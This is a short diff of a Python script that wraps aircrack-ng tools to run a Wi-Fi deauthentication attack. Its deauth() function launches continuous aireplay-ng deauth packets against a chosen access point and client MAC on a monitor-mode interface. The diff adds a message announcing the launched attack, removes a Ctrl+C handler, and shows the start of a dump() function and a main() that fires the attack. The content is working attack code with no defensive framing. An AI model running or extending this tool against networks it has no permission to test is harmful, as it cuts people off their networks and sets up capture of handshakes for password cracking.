@@ -1,12 +1,23 @@
 import subprocess, signal, sys, time, os, shutil, csv, glob
 
+import subprocess
+
 def deauth(ap_mac, c_mac, interface):
+    # Construct the command with the provided parameters
+    command = [
+        'sudo', 'aireplay-ng',
+        '-0', '0',  # Number of deauth packets to send, 0 means send them continuously
+        '-a', ap_mac,  # Access Point MAC address
+        '-c', c_mac,  # Client MAC address
+        interface  # Network interface to use
+    ]
+
+    # Run the command in the background
     try:
-        subprocess.Popen(['sudo', 'aireplay-ng', '-0', '0', '-a', ap_mac, '-c', c_mac, interface],
-                         stdout=subprocess.DEVNULL,
-                         stderr=subprocess.STDOUT)
+        subprocess.Popen(command)
+        print(f"Deauth attack launched against AP MAC: {ap_mac} and client MAC: {c_mac} using interface: {interface}")
     except Exception as e:
-        print(f"Failed to execute deauth command: {e}")
+        print(f"An error occurred when trying to launch deauth attack: {e}")
 
 def dump(ap_mac, channel):
     try:
@@ -220,9 +231,6 @@ def target_c(bssid):
 def main(essid, ap_mac, your_mac, c_mac):
     channel = "6"
     interface = "wlan0mon"
-
-    # Registering the Ctrl+C signal handler
-    signal.signal(signal.SIGINT, signal_handler)
 
     try:
         deauth(ap_mac, c_mac, interface)
